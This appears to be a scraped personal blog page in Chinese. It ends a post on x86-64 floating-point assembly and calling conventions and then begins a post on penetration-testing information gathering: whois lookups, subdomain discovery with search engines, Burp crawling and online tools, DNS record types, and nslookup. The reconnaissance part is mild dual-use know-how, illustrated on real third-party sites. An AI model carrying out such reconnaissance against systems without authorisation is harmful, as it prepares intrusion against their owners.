class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─$ gcc main.c -O0 -o main -g</span><br><span class="line"></span><br><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─$ objdump main -d &gt; main.asm</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0000000000001129 &lt;func&gt;:</span><br><span class="line">    1129:	55                   	push   %rbp</span><br><span class="line">    112a:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    112d:	f3 0f 10 0d cf 0e 00 	movss  0xecf(%rip),%xmm1        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1134:	00 </span><br><span class="line">    1135:	f3 0f 11 4d f0       	movss  %xmm1,-0x10(%rbp)</span><br><span class="line">    113a:	48 8d 45 f0          	lea    -0x10(%rbp),%rax</span><br><span class="line">    113e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">    1142:	48 8b 45 f8          	mov    -0x8(%rbp),%rax</span><br><span class="line">    1146:	f3 0f 10 00          	movss  (%rax),%xmm0</span><br><span class="line">    114a:	f3 0f 11 45 f4       	movss  %xmm0,-0xc(%rbp)</span><br><span class="line">    114f:	90                   	nop</span><br><span class="line">    1150:	5d                   	pop    %rbp</span><br><span class="line">    1151:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>和刚才一模一样<code>register float b=a;</code>这句直接被优化掉了</p>
<p>哦上帝啊,<code>-O0</code>的gcc竟然也会有优化</p>
<h4 id="浮点转换指令">浮点转换指令</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220606152907983.png"
alt="image-20220606152907983" />
<figcaption aria-hidden="true">image-20220606152907983</figcaption>
</figure>
<p>一看就明白,没必要做实验分析了</p>
<h4 id="其他指令">其他指令</h4>
<p>比较指令,位级运算指令都是按位进行的,类比整数的情形即可</p>
<h3 id="system-v-调用约定">System V 调用约定</h3>
<h4 id="参数传递约定">参数传递约定</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">float</span> a,<span class="type">float</span> b,<span class="type">float</span> c,<span class="type">float</span> d,<span class="type">float</span> e,</span></span><br><span class="line"><span class="params">          <span class="type">float</span> f,<span class="type">float</span> g,<span class="type">float</span> h,<span class="type">float</span> i,<span class="type">float</span> j)</span></span><br><span class="line">		&#123;&#125;<span class="comment">//传递十个参数</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─# gcc main.c -O0 -o main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─# objdump main -d &gt; main.asm</span><br></pre></td></tr></table></figure>
<p><code>main.asm</code></p>
<p>main函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">0000000000001158 &lt;main&gt;:</span><br><span class="line">;开端,帧指针压栈保存,帧指针获得此时栈顶指针拷贝</span><br><span class="line">    1158:	55                   	push   %rbp</span><br><span class="line">    1159:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    ;func的参数从右向左压栈,首先安排10的位置</span><br><span class="line">    ;PC相对寻址,将M[rip+0xea0]放在xmm0寄存器</span><br><span class="line">    115c:	f3 0f 10 05 a0 0e 00 	movss  0xea0(%rip),%xmm0        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1163:	00 </span><br><span class="line">    1164:	48 8d 64 24 f8       	lea    -0x8(%rsp),%rsp	;rsp=rsp-8,栈上申请8字节空间</span><br><span class="line">    1169:	f3 0f 11 04 24       	movss  %xmm0,(%rsp)		;从xmm0搬到M[rsp]上</span><br><span class="line">    </span><br><span class="line">    ;重复刚才的过程,压栈从右向左数的第二个参数</span><br><span class="line">    116e:	f3 0f 10 05 92 0e 00 	movss  0xe92(%rip),%xmm0        # 2008 &lt;_IO_stdin_used+0x8&gt;</span><br><span class="line">    1175:	00 </span><br><span class="line">    1176:	48 8d 64 24 f8       	lea    -0x8(%rsp),%rsp</span><br><span class="line">    117b:	f3 0f 11 04 24       	movss  %xmm0,(%rsp)</span><br><span class="line">    </span><br><span class="line">    ;此后的八个参数恰好用8个媒体寄存器xmm0~7传递</span><br><span class="line">    1180:	f3 0f 10 3d 84 0e 00 	movss  0xe84(%rip),%xmm7        # 200c &lt;_IO_stdin_used+0xc&gt;</span><br><span class="line">    1187:	00 </span><br><span class="line">    1188:	f3 0f 10 35 80 0e 00 	movss  0xe80(%rip),%xmm6        # 2010 &lt;_IO_stdin_used+0x10&gt;</span><br><span class="line">    118f:	00 </span><br><span class="line">    1190:	f3 0f 10 2d 7c 0e 00 	movss  0xe7c(%rip),%xmm5        # 2014 &lt;_IO_stdin_used+0x14&gt;</span><br><span class="line">    1197:	00 </span><br><span class="line">    1198:	f3 0f 10 25 78 0e 00 	movss  0xe78(%rip),%xmm4        # 2018 &lt;_IO_stdin_used+0x18&gt;</span><br><span class="line">    119f:	00 </span><br><span class="line">    11a0:	f3 0f 10 1d 74 0e 00 	movss  0xe74(%rip),%xmm3        # 201c &lt;_IO_stdin_used+0x1c&gt;</span><br><span class="line">    11a7:	00 </span><br><span class="line">    11a8:	f3 0f 10 15 70 0e 00 	movss  0xe70(%rip),%xmm2        # 2020 &lt;_IO_stdin_used+0x20&gt;</span><br><span class="line">    11af:	00 </span><br><span class="line">    11b0:	f3 0f 10 0d 6c 0e 00 	movss  0xe6c(%rip),%xmm1        # 2024 &lt;_IO_stdin_used+0x24&gt;</span><br><span class="line">    11b7:	00 </span><br><span class="line">    </span><br><span class="line">    ;蜜汁操作,就这个左边的参数搞特殊,非得用eax中转2一下,也是少见的64位机器上用到eax寄存器</span><br><span class="line">    11b8:	8b 05 6a 0e 00 00    	mov    0xe6a(%rip),%eax        # 2028 &lt;_IO_stdin_used+0x28&gt;</span><br><span class="line">    11be:	66 0f 6e c0          	movd   %eax,%xmm0</span><br><span class="line">    </span><br><span class="line">    ;参数准备完毕,可以调用函数func</span><br><span class="line">    11c2:	e8 62 ff ff ff       	call   1129 &lt;func&gt;</span><br><span class="line">    </span><br><span class="line">    ;尾声</span><br><span class="line">    11c7:	48 83 c4 10          	add    $0x10,%rsp	;传递最右侧两个参数时压栈16字节,此时正好退回16个字节.调用者清理参数</span><br><span class="line">    </span><br><span class="line">    ;eax存放main函数的返回值0</span><br><span class="line">    11cb:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">    11d0:	c9                   	leave  	;leave指令将栈中存放的rbp退还</span><br><span class="line">    11d1:	c3                   	ret    ;函数返回</span><br><span class="line">    </span><br><span class="line">    ;滥竽充数填充字节</span><br><span class="line">    11d2:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)</span><br><span class="line">    11d9:	00 00 00 </span><br><span class="line">    11dc:	0f 1f 40 00          	nopl   0x0(%rax)</span><br></pre></td></tr></table></figure>
<p>func函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0000000000001129 &lt;func&gt;:</span><br><span class="line">    1129:	55                   	push   %rbp</span><br><span class="line">    112a:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    112d:	f3 0f 11 45 fc       	movss  %xmm0,-0x4(%rbp)</span><br><span class="line">    1132:	f3 0f 11 4d f8       	movss  %xmm1,-0x8(%rbp)</span><br><span class="line">    1137:	f3 0f 11 55 f4       	movss  %xmm2,-0xc(%rbp)</span><br><span class="line">    113c:	f3 0f 11 5d f0       	movss  %xmm3,-0x10(%rbp)</span><br><span class="line">    1141:	f3 0f 11 65 ec       	movss  %xmm4,-0x14(%rbp)</span><br><span class="line">    1146:	f3 0f 11 6d e8       	movss  %xmm5,-0x18(%rbp)</span><br><span class="line">    114b:	f3 0f 11 75 e4       	movss  %xmm6,-0x1c(%rbp)</span><br><span class="line">    1150:	f3 0f 11 7d e0       	movss  %xmm7,-0x20(%rbp)</span><br><span class="line">    1155:	90                   	nop</span><br><span class="line">    1156:	5d                   	pop    %rbp</span><br><span class="line">    1157:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>这里使用媒体寄存器传递的参数又压入栈中,这和前面我们学习过的x64linux使用的System
V的整数传参时的约定是相同的</p>
<p>三个问题</p>
<p><strong>1.<code>movss  0xea0(%rip),%xmm0</code>此处的<code>0xea0(%rip)</code>指向啥东西</strong></p>
<p>使用ida64反编译观察</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000115C                 movss   xmm0, cs:dword_2004</span><br><span class="line">...</span><br><span class="line">.rodata:0000000000002004 dword_2004      dd 41200000h            ; DATA XREF: main+4↑r</span><br><span class="line">.rodata:0000000000002008 dword_2008      dd 41100000h            ; DATA XREF: main+16↑r</span><br><span class="line">.rodata:000000000000200C dword_200C      dd 41000000h            ; DATA XREF: main+28↑r</span><br><span class="line">.rodata:0000000000002010 dword_2010      dd 40E00000h            ; DATA XREF: main+30↑r</span><br><span class="line">.rodata:0000000000002014 dword_2014      dd 40C00000h            ; DATA XREF: main+38↑r</span><br><span class="line">.rodata:0000000000002018 dword_2018      dd 40A00000h            ; DATA XREF: main+40↑r</span><br><span class="line">.rodata:000000000000201C dword_201C      dd 40800000h            ; DATA XREF: main+48↑r</span><br><span class="line">.rodata:0000000000002020 dword_2020      dd 40400000h            ; DATA XREF: main+50↑r</span><br><span class="line">.rodata:0000000000002024 dword_2024      dd 40000000h            ; DATA XREF: main+58↑r</span><br><span class="line">.rodata:0000000000002028 dword_2028      dd 3F800000h            ; DATA XREF: main+60↑r</span><br></pre></td></tr></table></figure>
<p>可以发现,该位置在只读变量rodata区,存了这么一个值<code>0x41200000h</code></p>
<p>然而我们主函数中传递的是10啊,这存了一个鬼啊?</p>
<p>这就是IEEE754规定的浮点数存储方法了,下面我们可以算他一下</p>
<p>这个16进制数展开成一个32位二进制数为 <span class="math display">\[
0100&#39;0001&#39;0010&#39;0000&#39;0000&#39;0000&#39;0000&#39;0000
\]</span> 按照s,exp,frac划分开</p>
<table>
<thead>
<tr>
<th>s</th>
<th>exp</th>
<th>frac</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1000 0010</td>
<td>010 0000 0000 0000 0000</td>
</tr>
</tbody>
</table>
<p>对于一个32位的float,其exp占用k=8位,其frac占用n=23位</p>
<p><span
class="math inline">\(Bias=2^{k-1}-1=2^7-1=127(10)=0111&#39;1111(2)\)</span></p>
<p><span
class="math inline">\(E=exp-Bias=1000&#39;0010-0111&#39;1111=0000&#39;0011=3\)</span></p>
<p><span
class="math inline">\(M=1+frac=1+2^{-2}=\frac{5}{4}\)</span></p>
<p><span class="math inline">\((-1)^s\times M\times 2^E=1\times
\frac{5}{4}\times 2^3=10\)</span></p>
<p>正好是我们主函数中对func传递的参数中最右边那个</p>
<p>2.<strong>在最右侧两个参数压栈传递的时候</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1164:	48 8d 64 24 f8       	lea    -0x8(%rsp),%rsp	;rsp=rsp-8,栈上申请8字节空间</span><br><span class="line">1169:	f3 0f 11 04 24       	movss  %xmm0,(%rsp)		;从xmm0搬到M[rsp]上</span><br></pre></td></tr></table></figure>
<p>为啥每个参数要在栈上开8字节的空间?</p>
<p>后面func中将媒体寄存器中的参数压栈的时候却每个参数占用4字节的空间.</p>
<p>这也是x64Linux上System
V的调用约定,参数传递的时候要8字节对齐,不管是int还是long还是double还是float,只要是用栈传递参数,就要每个参数8字节对齐</p>
<p><strong>3.我们在main函数调用func时传递的参数都是立即数<code>1,2,3,4,5,6,7,8,9,10</code></strong></p>
<p>但是在汇编层面上为什么没有直接用立即数<code>$1,$2</code>这种,而是采用PC相对寻址,去.rodata区找变量呢?</p>
<p><code>115c:  f3 0f 10 05 a0 0e 00    movss  0xea0(%rip),%xmm0</code></p>
<p>这是浮点常数和整数常数的区别</p>
<p>与浮点操作相关的指令,不能以立即数作为操作数,编译器必须为所有常数分配和初始化存储空间</p>
<p>将常数写入内存,然后采用各种寻址方法去找常数</p>
<h4 id="返回值约定">返回值约定</h4>
<p>如果一个函数返回值为浮点类型,会使用什么寄存器返回呢?eax还是xmm0?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─# gcc main.c -O0 -c -o main.o</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─# objdump main.o -d &gt; main.s</span><br></pre></td></tr></table></figure>
<p><code>main.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;func&gt;:</span><br><span class="line">   0:	55                   	push   %rbp</span><br><span class="line">   1:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">   4:	f3 0f 10 05 00 00 00 	movss  0x0(%rip),%xmm0        # c &lt;func+0xc&gt;</span><br><span class="line">   b:	00 </span><br><span class="line">   c:	5d                   	pop    %rbp</span><br><span class="line">   d:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>用的xmm0寄存器传递浮点参数</p>
<h4 id="section"></h4>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/05/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">渗透测试信息收集</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-05 00:17:00" itemprop="dateCreated datePublished" datetime="2022-06-05T00:17:00+08:00">2022-06-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-07-22 21:12:58" itemprop="dateModified" datetime="2022-07-22T21:12:58+08:00">2022-07-22</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>今天是你的生日,但是有什么可以值得庆祝的呢?你就是一风暴兵罢了</p>
<h1 id="渗透测试信息收集">渗透测试信息收集</h1>
<h2 id="域名信息收集">域名信息收集</h2>
<h3 id="whois域名信息收集">Whois域名信息收集</h3>
<p>whois是一个标准互联网协议,用于收集注册域名,IP地址,自治系统信息,whois数据库中记录有该域名的DNS服务器信息和注册人的联系信息</p>
<p>在linux上直接用<code>whois &lt;domain&gt;</code>或者<code>whois &lt;ip_addreess&gt;</code></p>
<p>使用<code>whois --help</code>可以查看帮助</p>
<p>比如:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# whois baidu.com</span><br><span class="line">   Domain Name: BAIDU.COM</span><br><span class="line">   Registry Domain ID: 11181110_DOMAIN_COM-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.markmonitor.com</span><br><span class="line">   Registrar URL: http://www.markmonitor.com</span><br><span class="line">   Updated Date: 2022-01-25T09:00:46Z</span><br><span class="line">   Creation Date: 1999-10-11T11:05:17Z</span><br><span class="line">   Registry Expiry Date: 2026-10-11T11:05:17Z</span><br><span class="line">   Registrar: MarkMonitor Inc.</span><br><span class="line">   Registrar IANA ID: 292</span><br><span class="line">   Registrar Abuse Contact Email: abusecomplaints@markmonitor.com</span><br><span class="line">   Registrar Abuse Contact Phone: +1.2086851750</span><br><span class="line">   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited</span><br><span class="line">   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited</span><br><span class="line">   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited</span><br><span class="line">   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited</span><br><span class="line">   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited</span><br><span class="line">   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited</span><br><span class="line">   Name Server: NS1.BAIDU.COM</span><br><span class="line">   Name Server: NS2.BAIDU.COM</span><br><span class="line">   Name Server: NS3.BAIDU.COM</span><br><span class="line">   Name Server: NS4.BAIDU.COM</span><br><span class="line">   Name Server: NS7.BAIDU.COM</span><br><span class="line">   DNSSEC: unsigned</span><br></pre></td></tr></table></figure>
<figure>
<img
src="../AppData/Roaming/Typora/typora-user-images/image-20220603174503238.png"
alt="image-20220603174503238" />
<figcaption aria-hidden="true">image-20220603174503238</figcaption>
</figure>
<p>在windows上不能使用whois命令,但是可以去站长之家或者爱站网查询</p>
<p><a target="_blank" rel="noopener" href="https://www.chinaz.com/">站长之家</a></p>
<p><a target="_blank" rel="noopener" href="https://www.aizhan.com/">站长工具-爱站网</a></p>
<h3 id="子域名信息收集">子域名信息收集</h3>
<h4 id="搜索引擎方法">搜索引擎方法</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:&lt;domain&gt;</span><br><span class="line">e.g.</span><br><span class="line">site:dustball.top</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603174616042.png"
alt="image-20220603174616042" />
<figcaption aria-hidden="true">image-20220603174616042</figcaption>
</figure>
<h4 id="爬虫方法">爬虫方法</h4>
<p>burpsuite add new scan</p>
<p>比如爬某个学校的物理实验网站</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603222904097.png"
alt="image-20220603222904097" />
<figcaption aria-hidden="true">image-20220603222904097</figcaption>
</figure>
<h4 id="子域名查询网站">子域名查询网站</h4>
<p>爱站网</p>
<p>站长之家</p>
<p>比如查询某<del>H</del>电影的网站</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603223504262.png"
alt="image-20220603223504262" />
<figcaption aria-hidden="true">image-20220603223504262</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603223604889.png"
alt="image-20220603223604889" />
<figcaption aria-hidden="true">image-20220603223604889</figcaption>
</figure>
<p>他木有子域名</p>
<h4 id="本地工具">本地工具</h4>
<h5 id="layer子域名挖掘机">Layer子域名挖掘机</h5>
<p>windows上的子域名挖掘工具</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603223947457.png"
alt="image-20220603223947457" />
<figcaption aria-hidden="true">image-20220603223947457</figcaption>
</figure>
<h5 id="wydomain">wydomain</h5>
<p>linux上的工具</p>
<h4 id="备案号查询">备案号查询</h4>
<h4 id="ssl证书查询">SSL证书查询</h4>
<h4 id="crossdomain.xml文件">crossdomain.xml文件</h4>
<p>比如<code>https://www.baidu.com/crossdomain.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">&quot;*.baidu.com&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">&quot;*.bdstatic.com&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-http-request-headers-from</span> <span class="attr">domain</span>=<span class="string">&quot;*.baidu.com&quot;</span> <span class="attr">headers</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-http-request-headers-from</span> <span class="attr">domain</span>=<span class="string">&quot;*.bdstatic.com&quot;</span> <span class="attr">headers</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="dns信息收集">DNS信息收集</h3>
<h4 id="dns记录类型">DNS记录类型</h4>
<p>DNS数据库是一个分布式数据库,每一台DNS服务器都存储了一些资源记录,作用是记录域名到IP地址的映射</p>
<p>资源记录是一个四元组<code>(Name,Value,Type,TTL)</code></p>
<p>其中TTL是该条记录的生存时间,决定了资源记录应当从DNS服务器缓存中删除的时间</p>
<p>Type决定了记录的类型,Name和Value的意义都视Type而定</p>
<h5 id="typea">Type=A</h5>
<p>Name=主机名</p>
<p>Value=该主机名对应的IP地址</p>
<p>A类记录提供了标准的域名到IP的映射</p>
<blockquote>
<p>比如<code>(deutschball.github.io,185.199.109.153,A)</code></p>
</blockquote>
<p>显然这个记录应该由权威DNS服务器存储,当然其他各级DNS服务器都可以缓存,但是最终来源是权威DNS服务器.</p>
<p>Value指向的就是一台终端</p>
<h5 id="typens">Type=NS</h5>
<p>Name=域</p>
<p>Value=该域中一台权威DNS服务器的主机名</p>
<blockquote>
<p>权威DNS服务器:管理本域中的计算机IP和名称的映射.其作用类似于一个排的排长,其他计算机类似于班里的士兵,当其他班的士兵要找本班的许三多时,要先去找史班长问哪一个是许三多</p>
</blockquote>
<p>这种记录的作用是路由DNS查询,啥意思呢?</p>
<p>比如<code>(baidu.com,dns.baidu.com,NS)</code></p>
<p>在用户需要解析<code>baidu.com</code>时请求发往<code>baidu.com</code>域,然后这个域控(可能是域控?)会将该请求交给本域的DNS权威服务器<code>dns.baidu.com</code>去解析</p>
<h5 id="typecname">Type=CNAME</h5>
<p>Value是规范主机名,Name是该主机的别名</p>
<p>这个在搭建博客买域名的时候遇见过</p>
<p>本来的博客dns地址是<code>deutschball.github.io</code>,买了一个域名<code>dustball.top</code>,</p>
<p>在域名解析的时候并没有将<code>dustball.top</code>和<code>ip</code>地址直接挂钩,</p>
<p>而是增加了一条CNAME记录,将<code>dustball.top</code>和<code>deutschball.github.io</code>挂钩</p>
<p>实际解析成IP地址还是得指望原名和IP的A记录</p>
<h5 id="typemx">Type=MX</h5>
<p>Name=邮件服务器别名</p>
<p>Value=邮件服务器本名</p>
<p>MX记录允许邮件服务器具有简单的别名,通常是和web服务器同名,比如:</p>
<p><code>dustbal@mail.qq.com</code>写成<code>dustbal@qq.com</code>实际上是一个地址</p>
<p>MX的作用和CNAME类似,但是为了获得邮件服务器的规范主机名就是得用MX记录,其他服务器的规范主机名用CNAME记录</p>
<h4 id="dns记录查询">DNS记录查询</h4>
<p>nslookup命令</p>
<h5 id="查询a记录">查询A记录</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup &lt;域名&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[~]</span><br><span class="line">└─$ nslookup baidu.com</span><br><span class="line">Server:         172.28.0.1</span><br><span class="line">Address:        172.28.0.1#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   baidu.com</span><br><span class="line">Address: 220.181.38.148</span><br><span class="line">Name:   baidu.com</span><br><span class="line">Address: 220.181.38.251</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>抓包观察</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220603232445678.png"
alt="image-20220603232445678" />
<figcaption aria-hidden="true">image-20220603232445678</figcaption>
</figure>
<h5 id="查询mx记录">查询MX记录</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=mx &lt;域名&gt;</span><br></pre></td></tr></table></figure>
